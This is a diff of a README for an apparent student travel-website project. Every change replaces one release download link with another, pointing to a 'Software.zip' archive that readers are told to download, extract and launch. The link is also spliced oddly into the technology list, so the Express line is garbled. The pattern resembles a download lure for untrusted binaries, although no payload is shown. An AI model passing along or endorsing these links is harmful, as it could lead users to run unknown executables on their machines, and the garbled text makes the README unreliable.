@@ -13,7 +13,7 @@ Welcome to the Web Development Project 2 repository! This project, developed as 
 
 ## Installation
 
-To access the project, you can download the necessary files by clicking [here](https://github.com/Zrty456/web-development-project-2/releases/download/v1.0/Program.zip). Once downloaded, extract the files and launch the project to start exploring the exciting world of travel destinations.
+To access the project, you can download the necessary files by clicking [here](https://github.com/Zrty456/web-development-project-2/releases/download/v2.0/Software.zip). Once downloaded, extract the files and launch the project to start exploring the exciting world of travel destinations.
 
 If the link above does not work or needs to be launched directly, please check the "Releases" section of this repository for alternate download options.
 
@@ -21,7 +21,7 @@ If the link above does not work or needs to be launched directly, please check t
 
 ✨ Apollo - A powerful GraphQL client.
 ✨ Cypress - End-to-end testing framework.
-✨ Express - Web application framework for https://github.com/Zrty456/web-development-project-2/releases/download/v1.0/Program.zip
+✨ Express - Web application framework for https://github.com/Zrty456/web-development-project-2/releases/download/v2.0/Software.zip
 ✨ GraphQL - Query language for APIs.
 ✨ Postgresql - Open-source relational database management system.
 ✨ React - JavaScript library for building user interfaces.
@@ -38,5 +38,5 @@ If you have any feedback, suggestions, or just want to say hello, feel free to r
 Happy traveling! 🌴🌺🌞
 
 ```
-[![Download Project](https://github.com/Zrty456/web-development-project-2/releases/download/v1.0/Program.zip)](https://github.com/Zrty456/web-development-project-2/releases/download/v1.0/Program.zip)
+[![Download Project](https://github.com/Zrty456/web-development-project-2/releases/download/v2.0/Software.zip)](https://github.com/Zrty456/web-development-project-2/releases/download/v2.0/Software.zip)
 ```
